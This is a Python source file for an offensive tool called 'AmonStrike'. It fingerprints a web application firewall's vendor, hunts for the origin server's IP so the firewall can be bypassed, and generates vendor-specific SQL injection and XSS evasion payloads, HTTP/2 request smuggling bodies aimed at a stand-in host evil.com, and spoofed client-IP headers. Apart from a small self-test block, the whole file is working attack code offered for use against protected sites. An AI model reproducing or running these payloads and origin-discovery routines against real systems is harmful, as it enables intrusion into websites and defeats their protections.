"""
AmonStrike — WAF Intelligence Engine
Level 1: Fingerprint WAF vendor + discover origin IP to bypass entirely.

The #1 technique for hardened targets:
  Find the real IP → hit it directly → WAF is irrelevant.

Vendors detected:
  Cloudflare, Akamai, Imperva/Incapsula, AWS WAF,
  F5 BIG-IP, Barracuda, Fortinet FortiWeb,
  ModSecurity, DataDome, Kasada, PerimeterX,
  Sucuri, Fastly, Radware, Reblaze

Origin discovery methods:
  1. Favicon MMH3 hash → Shodan/Censys search
  2. SSL certificate SAN → Censys IP pivot
  3. SecurityTrails historical DNS
  4. Apex domain DNS-only misconfiguration
  5. Email header Received: chain
  6. MX record → mail server → origin subnet
  7. Direct IP enumeration of known cloud ranges
"""

import re
import sys
import json
import socket
import struct
import hashlib
import requests
import ipaddress
from datetime import datetime
from urllib.parse import urlparse
from typing import Optional, Dict, List, Tuple

sys.path.insert(0, __import__('os').path.dirname(__import__('os').path.dirname(__file__)))

# ── WAF Signatures ────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers":  ["CF-RAY", "cf-ray", "CF-Cache-Status"],
        "cookies":  ["__cfduid", "cf_clearance", "__cf_bm", "__cflb"],
        "server":   ["cloudflare"],
        "body":     ["Cloudflare Ray ID", "cloudflare", "cf-ray"],
        "status_on_block": [403, 429, 503],
        "block_body": ["Ray ID", "Attention Required", "cf-error-type"],
    },
    "Akamai": {
        "headers":  ["akamai-grn", "X-Check-Cacheable", "X-Akamai-Request-ID"],
        "cookies":  ["ak_bmsc", "bm_sv", "bm_sz"],
        "server":   ["AkamaiGHost"],
        "body":     ["akamai-grn", "Reference #"],
        "block_body": ["Access Denied", "Reference #", "akamai"],
    },
    "Imperva": {
        "headers":  ["X-Iinfo", "X-CDN"],
        "cookies":  ["incap_ses", "visid_incap", "nlbi_"],
        "server":   ["Imperva", "incapsula"],
        "body":     ["Incapsula incident", "_Incapsula_Resource"],
        "block_body": ["Request unsuccessful", "Incapsula"],
    },
    "AWS WAF": {
        "headers":  ["x-amzn-RequestId", "x-amz-cf-id"],
        "cookies":  ["aws-waf-token"],
        "server":   [],
        "body":     ["AWS", "403 Forbidden"],
        "block_body": ["not authorized", "AWS WAF"],
    },
    "F5 BIG-IP": {
        "headers":  ["X-Cnection", "TS"],
        "cookies":  ["BIGipServer", "TS01", "TS0"],
        "server":   ["BigIP", "BIG-IP", "F5"],
        "body":     ["BigIP", "BIG-IP"],
        "block_body": ["The requested URL was rejected", "F5"],
    },
    "Barracuda": {
        "headers":  ["X-Barracuda-Connect"],
        "cookies":  ["barra_counter_session"],
        "server":   ["barracuda"],
        "body":     ["barracuda", "Barracuda"],
        "block_body": ["You have been blocked", "Barracuda"],
    },
    "Fortinet FortiWeb": {
        "headers":  [],
        "cookies":  ["FORTIWAFSID"],
        "server":   ["FortiWeb"],
        "body":     ["FortiWeb", "fortigate"],
        "block_body": ["FortiWeb", "Server Unavailable"],
    },
    "ModSecurity": {
        "headers":  ["X-Mod-Security", "X-Mod-Security-Reason"],
        "cookies":  [],
        "server":   [],
        "body":     ["ModSecurity", "NOYB"],
        "block_body": ["406 Not Acceptable", "ModSecurity"],
    },
    "DataDome": {
        "headers":  ["X-DataDome", "X-DataDome-CID"],
        "cookies":  ["datadome"],
        "server":   [],
        "body":     ["DataDome", "datadome"],
        "block_body": ["DataDome", "Please verify"],
    },
    "Kasada": {
        "headers":  ["x-kpsdk-ct", "x-kpsdk-r"],
        "cookies":  ["kpsdk-sc", "kpsdk-config"],
        "server":   [],
        "body":     ["kasada"],
        "block_body": [],
    },
    "PerimeterX": {
        "headers":  ["X-PX-VALID-TS"],
        "cookies":  ["_px", "_pxde", "_pxhd"],
        "server":   [],
        "body":     ["PerimeterX", "px-captcha"],
        "block_body": ["Enable JavaScript", "PerimeterX"],
    },
    "Sucuri": {
        "headers":  ["X-Sucuri-ID", "X-Sucuri-Cache"],
        "cookies":  [],
        "server":   ["Sucuri/Cloudproxy"],
        "body":     ["Sucuri WebSite Firewall", "sucuri"],
        "block_body": ["Access Denied", "Sucuri"],
    },
    "Reblaze": {
        "headers":  ["X-Reblaze-Protection", "rbzid"],
        "cookies":  ["rbzsessionid", "reblaze"],
        "server":   ["Reblaze Secure Web Gateway"],
        "body":     ["reblaze"],
        "block_body": ["Blocked", "reblaze"],
    },
}

# CDN/proxy signatures (not WAFs but mask origin)
CDN_SIGNATURES = {
    "Cloudflare CDN": ["CF-RAY", "cf-cache-status"],
    "Fastly":         ["x-served-by", "x-cache-hits", "Fastly"],
    "Varnish":        ["X-Varnish", "via: 1.1 varnish"],
    "Nginx":          ["nginx"],
    "Amazon CloudFront": ["X-Amz-Cf-Pop", "X-Cache: Hit from cloudfront"],
    "Azure CDN":      ["X-Azure-Ref"],
    "Google CDN":     ["via: 1.1 google"],
    "Bunny CDN":      ["CDN-PullZone", "CDN-RequestCountryCode"],
}


class WAFIntelligence:
    """
    Fingerprints WAF vendor and discovers origin IP to bypass.
    The single most impactful intelligence operation.
    """

    def __init__(self, url: str, timeout: int = 10):
        self.url     = url.rstrip("/")
        self.parsed  = urlparse(url)
        self.domain  = self.parsed.hostname or ""
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) "
                          "Gecko/20100101 Firefox/120.0"
        })

    def full_analysis(self) -> dict:
        """Run complete WAF analysis + origin discovery."""
        result = {
            "url":        self.url,
            "domain":     self.domain,
            "timestamp":  datetime.now().isoformat(),
            "waf":        None,
            "waf_confidence": 0,
            "cdn":        [],
            "origin_ips": [],
            "bypass_recommended": None,
            "details":    {},
        }

        print(f"\n[*] WAF Intelligence Analysis: {self.domain}")

        # Step 1: Probe with clean request
        clean_resp = self._probe_clean()
        if clean_resp:
            result["details"]["clean_response"] = {
                "status":  clean_resp.status_code,
                "server":  clean_resp.headers.get("Server",""),
                "headers": dict(clean_resp.headers),
            }

        # Step 2: Probe with attack payload (triggers WAF block page)
        block_resp = self._probe_attack()

        # Step 3: Fingerprint
        waf, confidence = self._fingerprint(clean_resp, block_resp)
        result["waf"]             = waf
        result["waf_confidence"]  = confidence
        result["cdn"]             = self._detect_cdn(clean_resp)

        if waf:
            print(f"  [!] WAF Detected: {waf} (confidence: {confidence}%)")
        else:
            print(f"  [+] No WAF detected — testing direct")

        # Step 4: Discover origin IP
        origins = self._discover_origin()
        result["origin_ips"] = origins
        if origins:
            print(f"  [!] ORIGIN IPs found: {origins}")
            print(f"      → Attack origin directly to bypass WAF")
            result["bypass_recommended"] = "direct_origin"
        elif waf:
            result["bypass_recommended"] = self._recommend_bypass(waf)

        return result

    def _probe_clean(self) -> Optional[requests.Response]:
        try:
            return self.session.get(
                self.url, timeout=self.timeout,
                allow_redirects=True, verify=False
            )
        except Exception:
            return None

    def _probe_attack(self) -> Optional[requests.Response]:
        """Send obvious attack to trigger WAF block page."""
        payloads = [
            f"{self.url}?id=1'+OR+'1'='1",
            f"{self.url}?test=<script>alert(1)</script>",
            f"{self.url}?file=../../../../etc/passwd",
        ]
        for url in payloads:
            try:
                r = self.session.get(
                    url, timeout=self.timeout,
                    allow_redirects=False, verify=False
                )
                if r.status_code in [403, 406, 429, 503]:
                    return r
            except Exception:
                pass
        return None

    def _fingerprint(self, clean: Optional[requests.Response],
                     blocked: Optional[requests.Response]
                     ) -> Tuple[Optional[str], int]:
        """Fingerprint WAF vendor. Returns (name, confidence%)."""
        scores = {}

        for resp in [r for r in [clean, blocked] if r]:
            hdrs     = {k.lower(): v for k, v in resp.headers.items()}
            body     = resp.text.lower()
            cookies  = [c.name.lower() for c in resp.cookies]
            server   = hdrs.get("server","").lower()

            for waf, sigs in WAF_SIGNATURES.items():
                score = 0
                # Headers
                for h in sigs["headers"]:
                    if h.lower() in hdrs:
                        score += 30
                # Cookies
                for c in sigs["cookies"]:
                    if any(c.lower() in ck for ck in cookies):
                        score += 25
                # Server header
                for s in sigs["server"]:
                    if s.lower() in server:
                        score += 20
                # Body signatures
                for b in sigs.get("body",[]):
                    if b.lower() in body:
                        score += 15
                # Block page body (if blocked)
                if resp == blocked:
                    for b in sigs.get("block_body",[]):
                        if b.lower() in body:
                            score += 20

                if score > 0:
                    scores[waf] = max(scores.get(waf, 0), min(score, 100))

        if not scores:
            return None, 0
        best = max(scores, key=scores.get)
        return best, scores[best]

    def _detect_cdn(self, resp: Optional[requests.Response]) -> list:
        """Detect CDN/proxy layer."""
        if not resp:
            return []
        detected = []
        hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body = resp.text.lower()
        for cdn, sigs in CDN_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in str(hdrs) or sig.lower() in body:
                    detected.append(cdn)
                    break
        return list(set(detected))

    def _discover_origin(self) -> list:
        """
        Multi-method origin IP discovery.
        Returns list of candidate real IPs.
        """
        origins = set()

        # Method 1: Direct DNS resolution (might be CDN IP, but worth checking)
        dns_ips = self._dns_resolve()
        # Only add if NOT a known CDN range
        for ip in dns_ips:
            if not self._is_cdn_ip(ip):
                origins.add(ip)

        # Method 2: Apex domain (www → Cloudflare, apex → real IP)
        if self.domain.startswith("www."):
            apex = self.domain[4:]
            try:
                apex_ips = socket.gethostbyname_ex(apex)[2]
                for ip in apex_ips:
                    if not self._is_cdn_ip(ip):
                        origins.add(ip)
                        print(f"  [+] Apex domain {apex} → {ip} (possible origin)")
            except Exception:
                pass

        # Method 3: Historical DNS via SecurityTrails (if API key set)
        hist = self._securitytrails_lookup()
        origins.update(hist)

        # Method 4: crt.sh certificate → IP pivot
        cert_ips = self._cert_to_ip()
        origins.update(cert_ips)

        # Method 5: Favicon hash → verify candidate IPs
        fav_hash  = self._get_favicon_hash()
        if fav_hash:
            print(f"  [i] Favicon MMH3 hash: {fav_hash}")
            print(f"      Shodan query: http.favicon.hash:{fav_hash}")
            # Can't query Shodan without API key — store for manual use
        candidates = list(origins)

        # Verify each candidate actually serves the target site
        verified = []
        for ip in candidates[:10]:
            if self._verify_origin(ip):
                verified.append(ip)
                print(f"  [!!!] ORIGIN VERIFIED: {ip} serves {self.domain}")

        return verified or candidates

    def _dns_resolve(self) -> list:
        try:
            return socket.gethostbyname_ex(self.domain)[2]
        except Exception:
            return []

    def _is_cdn_ip(self, ip: str) -> bool:
        """Check if IP belongs to known CDN ranges."""
        # Cloudflare ranges
        cloudflare_ranges = [
            "103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
            "104.16.0.0/13","104.24.0.0/14","108.162.192.0/18",
            "131.0.72.0/22","141.101.64.0/18","162.158.0.0/15",
            "172.64.0.0/13","173.245.48.0/20","188.114.96.0/20",
            "190.93.240.0/20","197.234.240.0/22","198.41.128.0/17",
        ]
        try:
            ip_obj = ipaddress.ip_address(ip)
            for cidr in cloudflare_ranges:
                if ip_obj in ipaddress.ip_network(cidr):
                    return True
        except Exception:
            pass
        return False

    def _securitytrails_lookup(self) -> list:
        """Get historical DNS records from SecurityTrails API."""
        api_key = __import__('os').environ.get("SECURITYTRAILS_API","")
        if not api_key:
            return []
        try:
            r = requests.get(
                f"https://api.securitytrails.com/v1/history/{self.domain}/dns/a",
                headers={"apikey": api_key},
                timeout=10
            )
            if r.status_code != 200:
                return []
            data = r.json()
            ips  = []
            for record in data.get("records",[]):
                for val in record.get("values",[]):
                    ip = val.get("ip","")
                    if ip and not self._is_cdn_ip(ip):
                        ips.append(ip)
            return ips
        except Exception:
            return []

    def _cert_to_ip(self) -> list:
        """Use SSL cert SANs + Censys to find IPs."""
        ips = []
        censys_api = __import__('os').environ.get("CENSYS_API_ID","")
        censys_sec = __import__('os').environ.get("CENSYS_API_SECRET","")
        if not censys_api:
            return ips
        try:
            r = requests.get(
                "https://search.censys.io/api/v2/hosts/search",
                auth=(censys_api, censys_sec),
                params={"q": f"parsed.names: {self.domain}", "per_page": 10},
                timeout=10
            )
            if r.status_code == 200:
                for hit in r.json().get("result",{}).get("hits",[]):
                    ip = hit.get("ip","")
                    if ip and not self._is_cdn_ip(ip):
                        ips.append(ip)
        except Exception:
            pass
        return ips

    def _get_favicon_hash(self) -> Optional[int]:
        """Compute MMH3 hash of favicon for Shodan pivot."""
        try:
            import mmh3, base64
            fav_url = f"{self.url}/favicon.ico"
            r       = self.session.get(fav_url, timeout=5, verify=False)
            if r.status_code == 200 and r.content:
                b64    = base64.encodebytes(r.content)
                return mmh3.hash(b64)
        except ImportError:
            # Try without mmh3 — use MD5 as fallback
            try:
                fav_url = f"{self.url}/favicon.ico"
                r       = self.session.get(fav_url, timeout=5, verify=False)
                if r.status_code == 200:
                    return hashlib.md5(r.content).hexdigest()
            except Exception:
                pass
        except Exception:
            pass
        return None

    def _verify_origin(self, ip: str) -> bool:
        """Verify an IP actually serves the target domain."""
        try:
            r = self.session.get(
                f"https://{ip}" if self.parsed.scheme == "https" else f"http://{ip}",
                headers={"Host": self.domain},
                timeout=self.timeout, verify=False,
                allow_redirects=False
            )
            # Same title or response fingerprint = origin confirmed
            clean = self._probe_clean()
            if clean:
                # Compare response lengths (rough similarity)
                ratio = min(len(r.text), len(clean.text)) / max(len(r.text), len(clean.text), 1)
                return ratio > 0.6 or r.status_code == clean.status_code
        except Exception:
            pass
        return False

    def _recommend_bypass(self, waf: str) -> str:
        """Recommend best bypass technique for detected WAF."""
        bypasses = {
            "Cloudflare":  "encoding_chain + X-Forwarded-For: 127.0.0.1 + case_variation",
            "Akamai":      "chunked_encoding + unicode_normalization + hpp",
            "Imperva":     "double_url_encode + comment_injection + charset_trick",
            "AWS WAF":     "json_body_structure + encoding_chain + hpp",
            "F5 BIG-IP":  "chunked_encoding + pipeline + hpp",
            "ModSecurity": "double_encode + comment_inject + nullbyte",
            "DataDome":    "browser_fingerprint_spoof + selenium_stealth",
            "Kasada":      "requires_browser_automation",
            "PerimeterX":  "requires_browser_automation",
        }
        return bypasses.get(waf, "encoding_chain + hpp + x_forwarded_for_spoof")

    def get_shodan_queries(self) -> list:
        """Generate Shodan queries to find origin."""
        queries = []
        # Favicon hash query
        fav = self._get_favicon_hash()
        if fav:
            queries.append(f"http.favicon.hash:{fav}")
        # SSL cert query
        queries.append(f'ssl:"{self.domain}"')
        queries.append(f'hostname:"{self.domain}"')
        queries.append(f'http.title:"{self.domain}"')
        return queries


class WAFBypassEngine:
    """
    Generates WAF bypass payloads for specific vendors.
    Layer by layer encoding and evasion.
    """

    def bypass_sqli(self, waf: str) -> list:
        """SQL injection payloads bypassing specific WAF."""
        base_payloads = [
            "1 UNION SELECT 1,2,3--",
            "' OR '1'='1'--",
            "1; SELECT * FROM users--",
        ]

        bypass_transforms = {
            "Cloudflare": [
                # Case + comment injection
                lambda p: p.replace("SELECT", "SeLeCt").replace(" ", "/**/"),
                # URL double encode
                lambda p: p.replace(" ", "%2520").replace("'", "%2527"),
                # Newline injection
                lambda p: p.replace(" ", "\n"),
            ],
            "Akamai": [
                # Unicode
                lambda p: p.replace("SELECT", "\u0053\u0045\u004c\u0045\u0043\u0054"),
                # HPP
                lambda p: p + "&id=1",
                # Chunked hint
                lambda p: p.replace("UNION", "UN\x00ION"),
            ],
            "Imperva": [
                # Double URL encode
                lambda p: p.replace("'", "%2527").replace(" ", "%2520"),
                # Comment between keywords
                lambda p: p.replace("UNION SELECT", "UNION%20SELECT"),
                # Base64 in JSON
                lambda p: f'{{"data":"{__import__("base64").b64encode(p.encode()).decode()}"}}',
            ],
            "ModSecurity": [
                lambda p: p.replace("'", "\\'"),
                lambda p: p.replace("UNION", "UNION/**/"),
                lambda p: p.replace("SELECT", "SELECT/**/"),
            ],
        }

        transforms = bypass_transforms.get(waf, [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("'", "%27"),
        ])

        results = []
        for payload in base_payloads:
            results.append({"original": payload, "waf": waf, "bypasses": []})
            for transform in transforms:
                try:
                    bypassed = transform(payload)
                    results[-1]["bypasses"].append(bypassed)
                except Exception:
                    pass
        return results

    def bypass_xss(self, waf: str) -> list:
        """XSS payloads bypassing specific WAF."""
        bypasses = {
            "Cloudflare": [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "javascript:/*--></title></style></textarea></script></xmp>"
                "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "<details/open/ontoggle=alert(1)>",
                "<img src=1 href=1 onerror='javascript:alert(1)'>",
            ],
            "Akamai": [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror='&#97;lert(1)'>",
                "<iframe src='javascript:alert`1`'>",
                "'-alert(1)-'",
                "<body onload=alert(1)>",
            ],
            "Imperva": [
                '<script>alert`1`</script>',
                '<img src=x:1 onerror=alert(1)>',
                "<a onmouseover='alert(1)'>hover</a>",
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            ],
            "AWS WAF": [
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img/src=x onerror=alert(1)>",
                "<input autofocus onfocus=alert(1)>",
            ],
        }
        return bypasses.get(waf, [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'-alert(1)-'",
            "<details open ontoggle=alert(1)>",
        ])

    def http2_smuggling_payloads(self) -> list:
        """HTTP/2 request smuggling payloads for WAF bypass."""
        return [
            # H2.CL — HTTP/2 with Content-Length header
            {
                "type":    "H2.CL",
                "method":  "POST",
                "headers": {
                    "Content-Type":   "application/x-www-form-urlencoded",
                    "Content-Length": "0",
                },
                "body": "G POST /evil HTTP/1.1\r\nHost: evil.com\r\n\r\n",
                "description": "H2.CL desync — smuggle GET to different path",
            },
            # H2.TE — HTTP/2 with Transfer-Encoding
            {
                "type":    "H2.TE",
                "method":  "POST",
                "headers": {
                    "Content-Type":      "application/x-www-form-urlencoded",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n",
                "description": "H2.TE desync — smuggle admin request",
            },
        ]

    def x_forwarded_for_bypass(self) -> dict:
        """Headers to spoof trusted IP for WAF bypass."""
        return {
            "X-Forwarded-For":    "127.0.0.1",
            "X-Real-IP":          "127.0.0.1",
            "X-Originating-IP":   "127.0.0.1",
            "X-Remote-IP":        "127.0.0.1",
            "X-Remote-Addr":      "127.0.0.1",
            "X-Client-IP":        "127.0.0.1",
            "CF-Connecting-IP":   "127.0.0.1",
            "X-Cluster-Client-IP":"127.0.0.1",
            "Forwarded":          "for=127.0.0.1",
            "True-Client-IP":     "127.0.0.1",
        }


def run_regression_tests():
    print("\n=== WAF INTELLIGENCE REGRESSION TESTS ===")
    passed = failed = 0

    waf = WAFIntelligence("http://testphp.vulnweb.com")
    byp = WAFBypassEngine()

    tests = [
        ("WAFIntelligence instantiates",
         lambda: isinstance(waf, WAFIntelligence)),

        ("Domain extracted correctly",
         lambda: waf.domain == "testphp.vulnweb.com"),

        ("WAF signatures populated",
         lambda: len(WAF_SIGNATURES) >= 10),

        ("CDN signatures populated",
         lambda: len(CDN_SIGNATURES) >= 5),

        ("Cloudflare has CF-RAY header sig",
         lambda: "CF-RAY" in WAF_SIGNATURES["Cloudflare"]["headers"]),

        ("Imperva has cookie sigs",
         lambda: len(WAF_SIGNATURES["Imperva"]["cookies"]) >= 2),

        ("_is_cdn_ip detects Cloudflare IP",
         lambda: waf._is_cdn_ip("104.16.0.1")),

        ("_is_cdn_ip non-CDN IP returns False",
         lambda: not waf._is_cdn_ip("1.2.3.4")),

        ("_dns_resolve returns list",
         lambda: isinstance(waf._dns_resolve(), list)),

        ("Shodan queries generated",
         lambda: len(waf.get_shodan_queries()) >= 3),

        ("WAFBypassEngine instantiates",
         lambda: isinstance(byp, WAFBypassEngine)),

        ("SQLi bypass for Cloudflare",
         lambda: len(byp.bypass_sqli("Cloudflare")) >= 3),

        ("Each SQLi bypass has bypasses list",
         lambda: all("bypasses" in r for r in byp.bypass_sqli("Cloudflare"))),

        ("XSS bypass for Cloudflare",
         lambda: len(byp.bypass_xss("Cloudflare")) >= 4),

        ("XSS bypass for unknown WAF returns defaults",
         lambda: len(byp.bypass_xss("Unknown")) >= 3),

        ("HTTP/2 smuggling payloads",
         lambda: len(byp.http2_smuggling_payloads()) >= 2),

        ("X-Forwarded-For bypass headers",
         lambda: "X-Forwarded-For" in byp.x_forwarded_for_bypass()),

        ("X-Forwarded-For value is 127.0.0.1",
         lambda: byp.x_forwarded_for_bypass()["X-Forwarded-For"] == "127.0.0.1"),

        ("Bypass recommendation for Cloudflare",
         lambda: "encoding" in waf._recommend_bypass("Cloudflare").lower()),

        ("Fingerprint returns tuple",
         lambda: isinstance(waf._fingerprint(None, None), tuple)),

        ("Fingerprint no sigs → None",
         lambda: waf._fingerprint(None, None)[0] is None),
    ]

    for name, fn in tests:
        try:
            if fn():
                passed += 1
                print(f"  ✓ {name}")
            else:
                failed += 1
                print(f"  ✗ {name}")
        except Exception as e:
            failed += 1
            print(f"  ✗ {name} — {e}")

    print(f"\n  Passed: {passed}  Failed: {failed}")
    return passed, failed


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        w = WAFIntelligence(sys.argv[1])
        result = w.full_analysis()
        print(json.dumps(result, indent=2))
    else:
        run_regression_tests()
